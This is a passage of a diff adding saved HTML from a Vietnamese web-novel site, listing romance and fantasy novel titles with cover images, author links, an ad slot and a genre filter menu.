+                </h4>
+              </div>
+            </li>
+        
+            
+            <li>
+              <a href="https://truyennhieu.com/mot-thai-hai-bao-giam-doc-hang-ti-yeu-vo-tan-xuong" class="img-left" title="Một Thai Hai Bảo: Giám Đốc Hàng Tỉ Yêu Vợ Tận Xương - Hoa Dung Nguyệt Hạ">
+              <div class="box-absolute fn-shadow">
+                <div class="img">
+                  <img class="lozad" data-src="https://res.cloudinary.com/truyennhieu-images/image/upload/v1545717838/truyen/mot-thai-hai-bao-giam-doc-hang-ti-yeu-vo-tan-xuong.jpg" title="Một Thai Hai Bảo: Giám Đốc Hàng Tỉ Yêu Vợ Tận Xương - Hoa Dung Nguyệt Hạ" alt="Mot Thai Hai Bao Giam Doc Hang Ti Yeu Vo Tan Xuong - Hoa Dung Nguyet Ha" src="./truyennhieu_files/mot-thai-hai-bao-giam-doc-hang-ti-yeu-vo-tan-xuong.jpg" data-loaded="true">
+                </div>
+              </div>
+              </a>
+              <div class="box-book-info">
+                <h3 class="font-title" itemprop="name">
+                  <a href="https://truyennhieu.com/mot-thai-hai-bao-giam-doc-hang-ti-yeu-vo-tan-xuong" class="name-book ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Hoa Dung Nguyệt Hạ sáng tác">
+                    Một Thai Hai Bảo: Giám Đốc Hàng Tỉ Yêu Vợ Tận Xương</a>
+                </h3>
+                <h4 class="show-author">
+                  <a href="https://truyennhieu.com/tac-gia/hoa-dung-nguyet-ha/5be020cab19786223c89a0aa" class="name-author ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Hoa Dung Nguyệt Hạ sáng tác">Hoa Dung Nguyệt Hạ</a>
+                </h4>
+              </div>
+            </li>
+        
+            
+            <li>
+              <a href="https://truyennhieu.com/than-khong-thien-ha" class="img-left" title="Thần Khống Thiên Hạ - Ngã Bản Thuần Khiết">
+              <div class="box-absolute fn-shadow">
+                <div class="img">
+                  <img class="lozad" data-src="https://res.cloudinary.com/truyennhieu-images/image/upload/v1544711852/truyen/than-khong-thien-ha.jpg" title="Thần Khống Thiên Hạ - Ngã Bản Thuần Khiết" alt="Than Khong Thien Ha - Nga Ban Thuan Khiet" src="./truyennhieu_files/than-khong-thien-ha.jpg" data-loaded="true">
+                </div>
+              </div>
+              </a>
+              <div class="box-book-info">
+                <h3 class="font-title" itemprop="name">
+                  <a href="https://truyennhieu.com/than-khong-thien-ha" class="name-book ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Ngã Bản Thuần Khiết sáng tác">
+                    Thần Khống Thiên Hạ</a>
+                </h3>
+                <h4 class="show-author">
+                  <a href="https://truyennhieu.com/tac-gia/nga-ban-thuan-khiet/5be0f00eb2242828641703f7" class="name-author ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Ngã Bản Thuần Khiết sáng tác">Ngã Bản Thuần Khiết</a>
+                </h4>
+              </div>
+            </li>
+        
+            
+            <li>
+              <a href="https://truyennhieu.com/de-ba" class="img-left" title="Đế Bá - Yếm Bút Tiêu Sinh">
+              <div class="box-absolute fn-shadow">
+                <div class="img">
+                  <img class="lozad" data-src="https://res.cloudinary.com/truyennhieu-images/image/upload/v1544465181/truyen/de-ba.jpg" title="Đế Bá - Yếm Bút Tiêu Sinh" alt="De Ba - Yem But Tieu Sinh" src="./truyennhieu_files/de-ba.jpg" data-loaded="true">
+                </div>
+              </div>
+              </a>
+              <div class="box-book-info">
+                <h3 class="font-title" itemprop="name">
+                  <a href="https://truyennhieu.com/de-ba" class="name-book ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Yếm Bút Tiêu Sinh sáng tác">
+                    Đế Bá</a>
+                </h3>
+                <h4 class="show-author">
+                  <a href="https://truyennhieu.com/tac-gia/yem-but-tieu-sinh/5be0f575b224282864170ee9" class="name-author ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Yếm Bút Tiêu Sinh sáng tác">Yếm Bút Tiêu Sinh</a>
+                </h4>
+              </div>
+            </li>
+        
+            
+            <li>
+              <a href="https://truyennhieu.com/nhat-niem-vinh-hang" class="img-left" title="Nhất Niệm Vĩnh Hằng - Nhĩ Căn">
+              <div class="box-absolute fn-shadow">
+                <div class="img">
+                  <img class="lozad" data-src="https://res.cloudinary.com/truyennhieu-images/image/upload/v1544711659/truyen/nhat-niem-vinh-hang.jpg" title="Nhất Niệm Vĩnh Hằng - Nhĩ Căn" alt="Nhat Niem Vinh Hang - Nhi Can" src="./truyennhieu_files/nhat-niem-vinh-hang.jpg" data-loaded="true">
+                </div>
+              </div>
+              </a>
+              <div class="box-book-info">
+                <h3 class="font-title" itemprop="name">
+                  <a href="https://truyennhieu.com/nhat-niem-vinh-hang" class="name-book ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Nhĩ Căn sáng tác">
+                    Nhất Niệm Vĩnh Hằng</a>
+                </h3>
+                <h4 class="show-author">
+                  <a href="https://truyennhieu.com/tac-gia/nhi-can/5be0feb9b224282864172107" class="name-author ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Nhĩ Căn sáng tác">Nhĩ Căn</a>
+                </h4>
+              </div>
+            </li>
+        
+            
+            <li>
+              <a href="https://truyennhieu.com/boss-la-nu-phu" class="img-left" title="Boss Là Nữ Phụ - Mặc Linh">
+              <div class="box-absolute fn-shadow">
+                <div class="img">
+                  <img class="lozad" data-src="https://res.cloudinary.com/truyennhieu-images/image/upload/v1544710574/truyen/boss-la-nu-phu.jpg" title="Boss Là Nữ Phụ - Mặc Linh" alt="Boss La Nu Phu - Mac Linh" src="./truyennhieu_files/boss-la-nu-phu.jpg" data-loaded="true">
+                </div>
+              </div>
+              </a>
+              <div class="box-book-info">
+                <h3 class="font-title" itemprop="name">
+                  <a href="https://truyennhieu.com/boss-la-nu-phu" class="name-book ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Mặc Linh sáng tác">
+                    Boss Là Nữ Phụ</a>
+                </h3>
+                <h4 class="show-author">
+                  <a href="https://truyennhieu.com/tac-gia/mac-linh/5be0f038b224282864170416" class="name-author ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Mặc Linh sáng tác">Mặc Linh</a>
+                </h4>
+              </div>
+            </li>
+        
+            
+            <li>
+              <a href="https://truyennhieu.com/co-vo-ngot-ngao-co-chut-bat-luong-vo-moi-bat-luong-co-chut-ngot" class="img-left" title="Cô Vợ Ngọt Ngào Có Chút Bất Lương (Vợ Mới Bất Lương Có Chút Ngọt) - Quẫn Quẫn Hữu Yêu">
+              <div class="box-absolute fn-shadow">
+                <div class="img">
+                  <img class="lozad" data-src="https://res.cloudinary.com/truyennhieu-images/image/upload/v1544710486/truyen/co-vo-ngot-ngao-co-chut-bat-luong-vo-moi-bat-luong-co-chut-ngot.jpg" title="Cô Vợ Ngọt Ngào Có Chút Bất Lương (Vợ Mới Bất Lương Có Chút Ngọt) - Quẫn Quẫn Hữu Yêu" alt="Co Vo Ngot Ngao Co Chut Bat Luong Vo Moi Bat Luong Co Chut Ngot - Quan Quan Huu Yeu" src="./truyennhieu_files/co-vo-ngot-ngao-co-chut-bat-luong-vo-moi-bat-luong-co-chut-ngot.jpg" data-loaded="true">
+                </div>
+              </div>
+              </a>
+              <div class="box-book-info">
+                <h3 class="font-title" itemprop="name">
+                  <a href="https://truyennhieu.com/co-vo-ngot-ngao-co-chut-bat-luong-vo-moi-bat-luong-co-chut-ngot" class="name-book ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Quẫn Quẫn Hữu Yêu sáng tác">
+                    Cô Vợ Ngọt Ngào Có Chút Bất Lương (Vợ Mới Bất Lương Có Chút Ngọt)</a>
+                </h3>
+                <h4 class="show-author">
+                  <a href="https://truyennhieu.com/tac-gia/quan-quan-huu-yeu/5bdec66306c7c41b7eea0fe7" class="name-author ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Quẫn Quẫn Hữu Yêu sáng tác">Quẫn Quẫn Hữu Yêu</a>
+                </h4>
+              </div>
+            </li>
+        
+            
+            <li>
+              <a href="https://truyennhieu.com/pham-nhan-tu-tien" class="img-left" title="Phàm Nhân Tu Tiên - Vong Ngữ">
+              <div class="box-absolute fn-shadow">
+                <div class="img">
+                  <img class="lozad" data-src="https://cdnvn.truyenfull.vn/cover/o/eJzLyTDT17WITwqMNNQtNKp01A_zNXY1ifQuc8301HeEghwTR_1IV8PsTO-w4HKTUP1yI0NT3QxjIyMANRgRnA==/pham-nhan-tu-tien.jpg" title="Phàm Nhân Tu Tiên - Vong Ngữ" alt="Pham Nhan Tu Tien - Vong Ngu" src="./truyennhieu_files/pham-nhan-tu-tien.webp" data-loaded="true">
+                </div>
+              </div>
+              </a>
+              <div class="box-book-info">
+                <h3 class="font-title" itemprop="name">
+                  <a href="https://truyennhieu.com/pham-nhan-tu-tien" class="name-book ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Vong Ngữ sáng tác">
+                    Phàm Nhân Tu Tiên</a>
+                </h3>
+                <h4 class="show-author">
+                  <a href="https://truyennhieu.com/tac-gia/vong-ngu/5bdecba706c7c41b7eea240a" class="name-author ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Vong Ngữ sáng tác">Vong Ngữ</a>
+                </h4>
+              </div>
+            </li>
+        
+      </div>
+    </div>
+  </ul>
+
+
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="box-adsen">
+  <div class="wrap">	
+      <div class="container">	
+      <div class="show-adsen">
+      <script async="" src="./truyennhieu_files/f(2).txt"></script>
+      <!-- Home -->
+      <ins class="adsbygoogle" style="display: block; height: 90px; padding-left: 0px; padding-top: 0px; text-align: center;" data-ad-client="ca-pub-2978388862278998" data-ad-slot="5364563701" data-ad-format="auto" data-full-width-responsive="true" data-adsbygoogle-status="done" data-mytype="name_baner"><img data-mytype="name_baner" style="display:none !important;"><div data-mytype="name_baner" style="height: 90px; width: 1140px; border: 1px solid rgb(221, 220, 218); background: none; font-family: Roboto, Arial, sans-serif !important;"><div style="width:1140px;height:90px;display:inline-block;margin-left:0px;background:#fff;"></div></div></ins>
+      <script>
+           (adsbygoogle = window.adsbygoogle || []).push({});
+      </script>
+      </div>
+      </div>
+  </div>
+</div>
+
+
+  
+      <div class="box-top-novel">
+    <div class="wrap">
+      <div class="container">
+        <div class="tile-main-title">
+          <div class="box-icon"> <i class="truyenn-icon_hot"></i> </div>
+          <div class="box-txt-show">
+            <h2>Truyện Ngôn Tình Hay Nhất</h2>
+          </div>
+        </div>
+        <div class="box-full-book">
+          <ul class="box-subject-book">
+              
+                
+                    <li>
+                        <a href="https://truyennhieu.com/mot-thai-hai-bao-giam-doc-hang-ti-yeu-vo-tan-xuong" class="img-left" title="Một Thai Hai Bảo: Giám Đốc Hàng Tỉ Yêu Vợ Tận Xương - Hoa Dung Nguyệt Hạ">
+                        <div class="box-absolute fn-shadow">
+                            <div class="img">
+                                <img class="lozad" data-src="https://res.cloudinary.com/truyennhieu-images/image/upload/v1545717838/truyen/mot-thai-hai-bao-giam-doc-hang-ti-yeu-vo-tan-xuong.jpg" title="Một Thai Hai Bảo: Giám Đốc Hàng Tỉ Yêu Vợ Tận Xương - Hoa Dung Nguyệt Hạ" alt="" src="./truyennhieu_files/mot-thai-hai-bao-giam-doc-hang-ti-yeu-vo-tan-xuong.jpg" data-loaded="true">
+                            </div>
+                        </div>
+                        </a>
+                        <div class="box-book-info">
+                            <h3 class="font-title">
+                                <a href="https://truyennhieu.com/mot-thai-hai-bao-giam-doc-hang-ti-yeu-vo-tan-xuong" class="name-book ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Hoa Dung Nguyệt Hạ sáng tác">Một Thai Hai Bảo: Giám Đốc Hàng Tỉ Yêu Vợ Tận Xương</a>
+                            </h3>
+                            <h4 class="show-author"><a href="https://truyennhieu.com/tac-gia/hoa-dung-nguyet-ha/5be020cab19786223c89a0aa" class="name-author ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Hoa Dung Nguyệt Hạ sáng tác">Hoa Dung Nguyệt Hạ</a></h4>
+                    </div></li>
+                
+                    <li>
+                        <a href="https://truyennhieu.com/nguoi-phu-nu-cua-tong-giam-doc" class="img-left" title="Người Phụ Nữ Của Tổng Giám Đốc - Minh Châu Hoàn">
+                        <div class="box-absolute fn-shadow">
+                            <div class="img">
+                                <img class="lozad" data-src="https://res.cloudinary.com/truyennhieu-images/image/upload/v1545717838/truyen/nguoi-phu-nu-cua-tong-giam-doc.jpg" title="Người Phụ Nữ Của Tổng Giám Đốc - Minh Châu Hoàn" alt="" src="./truyennhieu_files/nguoi-phu-nu-cua-tong-giam-doc.jpg" data-loaded="true">
+                            </div>
+                        </div>
+                        </a>
+                        <div class="box-book-info">
+                            <h3 class="font-title">
+                                <a href="https://truyennhieu.com/nguoi-phu-nu-cua-tong-giam-doc" class="name-book ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Minh Châu Hoàn sáng tác">Người Phụ Nữ Của Tổng Giám Đốc</a>
+                            </h3>
+                            <h4 class="show-author"><a href="https://truyennhieu.com/tac-gia/minh-chau-hoan/5be1c70c1b07282cdf88ea9c" class="name-author ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Minh Châu Hoàn sáng tác">Minh Châu Hoàn</a></h4>
+                    </div></li>
+                
+                    <li>
+                        <a href="https://truyennhieu.com/hon-trom-55-lan" class="img-left" title="Hôn Trộm 55 Lần - Diệp Phi Dạ">
+                        <div class="box-absolute fn-shadow">
+                            <div class="img">
+                                <img class="lozad" data-src="https://res.cloudinary.com/truyennhieu-images/image/upload/v1545717838/truyen/hon-trom-55-lan.jpg" title="Hôn Trộm 55 Lần - Diệp Phi Dạ" alt="" src="./truyennhieu_files/hon-trom-55-lan.jpg" data-loaded="true">
+                            </div>
+                        </div>
+                        </a>
+                        <div class="box-book-info">
+                            <h3 class="font-title">
+                                <a href="https://truyennhieu.com/hon-trom-55-lan" class="name-book ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Diệp Phi Dạ sáng tác">Hôn Trộm 55 Lần</a>
+                            </h3>
+                            <h4 class="show-author"><a href="https://truyennhieu.com/tac-gia/diep-phi-da/5be1c6d81b07282cdf88ea36" class="name-author ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Diệp Phi Dạ sáng tác">Diệp Phi Dạ</a></h4>
+                    </div></li>
+                
+                    <li>
+                        <a href="https://truyennhieu.com/hop-dong-hon-nhan-100-ngay" class="img-left" title="Hợp Đồng Hôn Nhân 100 Ngày - Thượng Quan Miễu Miễu">
+                        <div class="box-absolute fn-shadow">
+                            <div class="img">
+                                <img class="lozad" data-src="https://res.cloudinary.com/truyennhieu-images/image/upload/v1545719455/truyen/hop-dong-hon-nhan-100-ngay.jpg" title="Hợp Đồng Hôn Nhân 100 Ngày - Thượng Quan Miễu Miễu" alt="" src="./truyennhieu_files/hop-dong-hon-nhan-100-ngay.jpg" data-loaded="true">
+                            </div>
+                        </div>
+                        </a>
+                        <div class="box-book-info">
+                            <h3 class="font-title">
+                                <a href="https://truyennhieu.com/hop-dong-hon-nhan-100-ngay" class="name-book ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Thượng Quan Miễu Miễu sáng tác">Hợp Đồng Hôn Nhân 100 Ngày</a>
+                            </h3>
+                            <h4 class="show-author"><a href="https://truyennhieu.com/tac-gia/thuong-quan-mieu-mieu/5be559a62a39d0411744e3cd" class="name-author ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Thượng Quan Miễu Miễu sáng tác">Thượng Quan Miễu Miễu</a></h4>
+                    </div></li>
+                
+                    <li>
+                        <a href="https://truyennhieu.com/co-vo-tong-giam-doc-xinh-dep-cua-toi" class="img-left" title="Cô Vợ Tổng Giám Đốc Xinh Đẹp Của Tôi - Mai Can Thái Thiếu Bính">
+                        <div class="box-absolute fn-shadow">
+                            <div class="img">
+                                <img class="lozad" data-src="https://res.cloudinary.com/truyennhieu-images/image/upload/v1545717839/truyen/co-vo-tong-giam-doc-xinh-dep-cua-toi.jpg" title="Cô Vợ Tổng Giám Đốc Xinh Đẹp Của Tôi - Mai Can Thái Thiếu Bính" alt="" src="./truyennhieu_files/co-vo-tong-giam-doc-xinh-dep-cua-toi.jpg" data-loaded="true">
+                            </div>
+                        </div>
+                        </a>
+                        <div class="box-book-info">
+                            <h3 class="font-title">
+                                <a href="https://truyennhieu.com/co-vo-tong-giam-doc-xinh-dep-cua-toi" class="name-book ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Mai Can Thái Thiếu Bính sáng tác">Cô Vợ Tổng Giám Đốc Xinh Đẹp Của Tôi</a>
+                            </h3>
+                            <h4 class="show-author"><a href="https://truyennhieu.com/tac-gia/mai-can-thai-thieu-binh/5be55a752a39d0411744e564" class="name-author ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Mai Can Thái Thiếu Bính sáng tác">Mai Can Thái Thiếu Bính</a></h4>
+                    </div></li>
+                
+                    <li>
+                        <a href="https://truyennhieu.com/bao-boi-cua-tong-giam-doc" class="img-left" title="Bảo Bối Của Tổng Giám Đốc - Hoạ Thuỷ">
+                        <div class="box-absolute fn-shadow">
+                            <div class="img">
+                                <img class="lozad" data-src="https://res.cloudinary.com/truyennhieu-images/image/upload/v1545719720/truyen/bao-boi-cua-tong-giam-doc.jpg" title="Bảo Bối Của Tổng Giám Đốc - Hoạ Thuỷ" alt="" src="./truyennhieu_files/bao-boi-cua-tong-giam-doc.jpg" data-loaded="true">
+                            </div>
+                        </div>
+                        </a>
+                        <div class="box-book-info">
+                            <h3 class="font-title">
+                                <a href="https://truyennhieu.com/bao-boi-cua-tong-giam-doc" class="name-book ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Hoạ Thuỷ sáng tác">Bảo Bối Của Tổng Giám Đốc</a>
+                            </h3>
+                            <h4 class="show-author"><a href="https://truyennhieu.com/tac-gia/hoa-thuy/5be803665ce85f4bc1f58fd8" class="name-author ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Hoạ Thuỷ sáng tác">Hoạ Thuỷ</a></h4>
+                    </div></li>
+                
+                    <li>
+                        <a href="https://truyennhieu.com/mot-dem-me-loan-dai-ca-xa-hoi-den-dung-toi-day" class="img-left" title="Một Đêm Mê Loạn: Đại Ca Xã Hội Đen Đừng Tới Đây - Chân Huyến Lệ">
+                        <div class="box-absolute fn-shadow">
+                            <div class="img">
+                                <img class="lozad" data-src="https://res.cloudinary.com/truyennhieu-images/image/upload/v1545717838/truyen/mot-dem-me-loan-dai-ca-xa-hoi-den-dung-toi-day.jpg" title="Một Đêm Mê Loạn: Đại Ca Xã Hội Đen Đừng Tới Đây - Chân Huyến Lệ" alt="" src="./truyennhieu_files/mot-dem-me-loan-dai-ca-xa-hoi-den-dung-toi-day.jpg" data-loaded="true">
+                            </div>
+                        </div>
+                        </a>
+                        <div class="box-book-info">
+                            <h3 class="font-title">
+                                <a href="https://truyennhieu.com/mot-dem-me-loan-dai-ca-xa-hoi-den-dung-toi-day" class="name-book ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Chân Huyến Lệ sáng tác">Một Đêm Mê Loạn: Đại Ca Xã Hội Đen Đừng Tới Đây</a>
+                            </h3>
+                            <h4 class="show-author"><a href="https://truyennhieu.com/tac-gia/chan-huyen-le/5bea7ef9354e2d5eb5b97ffc" class="name-author ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Chân Huyến Lệ sáng tác">Chân Huyến Lệ</a></h4>
+                    </div></li>
+                
+                    <li>
+                        <a href="https://truyennhieu.com/hao-mon-tranh-dau-i-nguoi-tinh-nho-ben-canh-tong-giam-doc" class="img-left" title="Hào Môn Tranh Đấu I: Người Tình Nhỏ Bên Cạnh Tổng Giám Đốc - Hàn Trinh Trinh">
+                        <div class="box-absolute fn-shadow">
+                            <div class="img">
+                                <img class="lozad" data-src="https://res.cloudinary.com/truyennhieu-images/image/upload/v1545717838/truyen/hao-mon-tranh-dau-i-nguoi-tinh-nho-ben-canh-tong-giam-doc.jpg" title="Hào Môn Tranh Đấu I: Người Tình Nhỏ Bên Cạnh Tổng Giám Đốc - Hàn Trinh Trinh" alt="" src="./truyennhieu_files/hao-mon-tranh-dau-i-nguoi-tinh-nho-ben-canh-tong-giam-doc.jpg" data-loaded="true">
+                            </div>
+                        </div>
+                        </a>
+                        <div class="box-book-info">
+                            <h3 class="font-title">
+                                <a href="https://truyennhieu.com/hao-mon-tranh-dau-i-nguoi-tinh-nho-ben-canh-tong-giam-doc" class="name-book ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Hàn Trinh Trinh sáng tác">Hào Môn Tranh Đấu I: Người Tình Nhỏ Bên Cạnh Tổng Giám Đốc</a>
+                            </h3>
+                            <h4 class="show-author"><a href="https://truyennhieu.com/tac-gia/han-trinh-trinh/5bea87b9354e2d5eb5b991a4" class="name-author ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Hàn Trinh Trinh sáng tác">Hàn Trinh Trinh</a></h4>
+                    </div></li>
+                
+                    <li>
+                        <a href="https://truyennhieu.com/doc-y-than-nu-phuc-hac-lanh-de-cuong-sung-the" class="img-left" title="Độc Y Thần Nữ: Phúc Hắc Lãnh Đế Cuồng Sủng Thê - Nguyệt Hạ Khuynh Ca">
+                        <div class="box-absolute fn-shadow">
+                            <div class="img">
+                                <img class="lozad" data-src="https://res.cloudinary.com/truyennhieu-images/image/upload/v1545717838/truyen/doc-y-than-nu-phuc-hac-lanh-de-cuong-sung-the.jpg" title="Độc Y Thần Nữ: Phúc Hắc Lãnh Đế Cuồng Sủng Thê - Nguyệt Hạ Khuynh Ca" alt="" src="./truyennhieu_files/doc-y-than-nu-phuc-hac-lanh-de-cuong-sung-the.jpg" data-loaded="true">
+                            </div>
+                        </div>
+                        </a>
+                        <div class="box-book-info">
+                            <h3 class="font-title">
+                                <a href="https://truyennhieu.com/doc-y-than-nu-phuc-hac-lanh-de-cuong-sung-the" class="name-book ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Nguyệt Hạ Khuynh Ca sáng tác">Độc Y Thần Nữ: Phúc Hắc Lãnh Đế Cuồng Sủng Thê</a>
+                            </h3>
+                            <h4 class="show-author"><a href="https://truyennhieu.com/tac-gia/nguyet-ha-khuynh-ca/5bedce8c4858996227dbf316" class="name-author ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Nguyệt Hạ Khuynh Ca sáng tác">Nguyệt Hạ Khuynh Ca</a></h4>
+                    </div></li>
+                
+                    <li>
+                        <a href="https://truyennhieu.com/tuyet-sac-dan-duoc-su-quy-vuong-yeu-phi" class="img-left" title="Tuyệt Sắc Đan Dược Sư: Quỷ Vương Yêu Phi - Tiêu Thất Gia">
+                        <div class="box-absolute fn-shadow">
+                            <div class="img">
+                                <img class="lozad" data-src="https://res.cloudinary.com/truyennhieu-images/image/upload/v1545717838/truyen/tuyet-sac-dan-duoc-su-quy-vuong-yeu-phi.jpg" title="Tuyệt Sắc Đan Dược Sư: Quỷ Vương Yêu Phi - Tiêu Thất Gia" alt="" src="./truyennhieu_files/tuyet-sac-dan-duoc-su-quy-vuong-yeu-phi.jpg" data-loaded="true">
+                            </div>
+                        </div>
+                        </a>
+                        <div class="box-book-info">
+                            <h3 class="font-title">
+                                <a href="https://truyennhieu.com/tuyet-sac-dan-duoc-su-quy-vuong-yeu-phi" class="name-book ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Tiêu Thất Gia sáng tác">Tuyệt Sắc Đan Dược Sư: Quỷ Vương Yêu Phi</a>
+                            </h3>
+                            <h4 class="show-author"><a href="https://truyennhieu.com/tac-gia/tieu-that-gia/5be263d97f0e2b2fdfe63da6" class="name-author ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Tiêu Thất Gia sáng tác">Tiêu Thất Gia</a></h4>
+                    </div></li>
+                
+                    <li>
+                        <a href="https://truyennhieu.com/me-17-tuoi-con-trai-thien-tai-cha-phuc-hac" class="img-left" title="Mẹ 17 Tuổi: Con Trai Thiên Tài Cha Phúc Hắc - Trình Ninh Tĩnh">
+                        <div class="box-absolute fn-shadow">
+                            <div class="img">
+                                <img class="lozad" data-src="https://res.cloudinary.com/truyennhieu-images/image/upload/v1545717838/truyen/me-17-tuoi-con-trai-thien-tai-cha-phuc-hac.jpg" title="Mẹ 17 Tuổi: Con Trai Thiên Tài Cha Phúc Hắc - Trình Ninh Tĩnh" alt="" src="./truyennhieu_files/me-17-tuoi-con-trai-thien-tai-cha-phuc-hac.jpg" data-loaded="true">
+                            </div>
+                        </div>
+                        </a>
+                        <div class="box-book-info">
+                            <h3 class="font-title">
+                                <a href="https://truyennhieu.com/me-17-tuoi-con-trai-thien-tai-cha-phuc-hac" class="name-book ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Trình Ninh Tĩnh sáng tác">Mẹ 17 Tuổi: Con Trai Thiên Tài Cha Phúc Hắc</a>
+                            </h3>
+                            <h4 class="show-author"><a href="https://truyennhieu.com/tac-gia/trinh-ninh-tinh/5bf0638e4858996227e156de" class="name-author ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Trình Ninh Tĩnh sáng tác">Trình Ninh Tĩnh</a></h4>
+                    </div></li>
+                
+                    <li>
+                        <a href="https://truyennhieu.com/ep-yeu-100-ngay-manh-me-yeu-nhau-100-ngay" class="img-left" title="Ép Yêu 100 Ngày (Mạnh Mẽ Yêu Nhau 100 Ngày) - Diệp Phi Dạ">
+                        <div class="box-absolute fn-shadow">
+                            <div class="img">
+                                <img class="lozad" data-src="https://res.cloudinary.com/truyennhieu-images/image/upload/v1545717838/truyen/ep-yeu-100-ngay-manh-me-yeu-nhau-100-ngay.jpg" title="Ép Yêu 100 Ngày (Mạnh Mẽ Yêu Nhau 100 Ngày) - Diệp Phi Dạ" alt="" src="./truyennhieu_files/ep-yeu-100-ngay-manh-me-yeu-nhau-100-ngay.jpg" data-loaded="true">
+                            </div>
+                        </div>
+                        </a>
+                        <div class="box-book-info">
+                            <h3 class="font-title">
+                                <a href="https://truyennhieu.com/ep-yeu-100-ngay-manh-me-yeu-nhau-100-ngay" class="name-book ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Diệp Phi Dạ sáng tác">Ép Yêu 100 Ngày (Mạnh Mẽ Yêu Nhau 100 Ngày)</a>
+                            </h3>
+                            <h4 class="show-author"><a href="https://truyennhieu.com/tac-gia/diep-phi-da/5be1c6d81b07282cdf88ea36" class="name-author ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Diệp Phi Dạ sáng tác">Diệp Phi Dạ</a></h4>
+                    </div></li>
+                
+              
+            <!--end list book 3 item -->
+          </ul>
+        </div>
+      </div>
+    </div>
+  </div>
+  
+
+<div class="box-top-novel">
+  <div class="wrap">
+    <div class="container">
+      <div class="left-content">
+        <div class="tile-main-title">
+          <div class="box-icon"> <i class="truyenn-icon-star-full"></i> </div>
+          <div class="box-txt-show">
+            <h2>Truyện mới cập nhật</h2>
+          </div>
+          <div class="right-slect-field">
+            <div class="custom-select-wrapper">
+							<div class="custom-select-wrapper"><select name="sources" id="updateSources" class="custom-select sources" placeholder="Tất cả" aria-label="Chọn thể loại" style="display: none;">
+								<option value="">Tất cả</option>
+								
+									<option value="5c552b080883cb449f3ee186"></option>
+								
+									<option value="5bdec66306c7c41b7eea0fe4">Tiên Hiệp</option>
+								
+									<option value="5be109e6b22428286417369f">Kiếm Hiệp</option>
+								
+									<option value="5bdec27dc551731a60abe1ff">Ngôn Tình</option>
+								
+									<option value="5bdec27dc551731a60abe201">Đô Thị</option>
+								
+									<option value="5be6a6689d614d46ffa68d92">Quan Trường</option>
+								
+									<option value="5bdf022606c7c41b7eea55c0">Võng Du</option>
+								
+									<option value="5bdf18bc06c7c41b7eea8070">Khoa Huyễn</option>
+								
+									<option value="5bdecab406c7c41b7eea20b9">Huyền Huyễn</option>
+								
+									<option value="5bdecab406c7c41b7eea20b6">Dị Giới</option>
+								
+									<option value="5be1c56b1b07282cdf88e775">Dị Năng</option>
+								
+									<option value="5be67f9e9d614d46ffa63eb4">Quân Sự</option>
+								
+									<option value="5be1b09ee2f0522ba9218079">Lịch Sử</option>
+								
+									<option value="5bdecab406c7c41b7eea20b8">Xuyên Không</option>
+								
+									<option value="5bdfb00f8ee5f91f329931cc">Trọng Sinh</option>
+								
+									<option value="5be268277f0e2b2fdfe6461c">Trinh Thám</option>
+								
+									<option value="5be25add7f0e2b2fdfe62c1b">Thám Hiểm</option>
+								
+									<option value="5be2af29ea81db31673b318f">Linh Dị</option>
+								
+									<option value="5be10a0ab2242828641736e8">Sắc</option>
+								
+									<option value="5be1bbf9e2f0522ba92180d5">Ngược</option>
+								
+									<option value="5bdec66306c7c41b7eea0fe8">Sủng</option>
+								
+									<option value="5be3b84d6e8d9936a27d6602">Cung Đấu</option>
+								
+									<option value="5be1be3ce2f0522ba9218544">Nữ Cường</option>
+								
+									<option value="5be2639f7f0e2b2fdfe63d31">Gia Đấu</option>
+								
+									<option value="5be679bc9d614d46ffa62b08">Đông Phương</option>
+								
+									<option value="5bdf162c06c7c41b7eea7b78">Đam Mỹ</option>
+								
+									<option value="5be7208e5ce85f4bc1f4ca89">Bách Hợp</option>
+								
+									<option value="5bdec66306c7c41b7eea0fe6">Hài Hước</option>
+								
+									<option value="5be266f47f0e2b2fdfe643b9">Điền Văn</option>
+								
+									<option value="5be10a3ab224282864173745">Cổ Đại</option>
+								
+									<option value="5be267aa7f0e2b2fdfe64523">Mạt Thế</option>
+								
+									<option value="5bdefffe06c7c41b7eea519b">Truyện Teen</option>
+								
